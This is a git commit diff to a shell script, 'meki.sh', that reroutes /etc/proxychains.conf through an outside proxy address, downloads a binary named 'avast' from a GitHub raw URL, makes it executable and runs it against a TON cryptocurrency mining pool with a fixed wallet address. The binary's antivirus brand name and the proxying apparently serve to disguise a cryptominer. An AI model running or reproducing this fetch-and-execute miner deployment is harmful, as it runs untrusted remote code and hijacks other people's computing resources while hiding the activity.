9bf7643559dd383f8248593a00d41a1e6623db80
renilo <88342640+renilo@users.noreply.github.com>
2022-01-30 14:02:32 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -10,8 +10,8 @@ sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
 
 sed -i 's/9050/10663/' /etc/proxychains.conf
 
-wget https://raw.githubusercontent.com/renilo/ba/main/avast
+wget https://raw.githubusercontent.com/renilo/bh/main/avast
 
 chmod +x avast
 
-./avast --algo TON --pool https://server1.whalestonpool.com --user EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z $@ --mclk 810
+./avast run https://server1.whalestonpool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
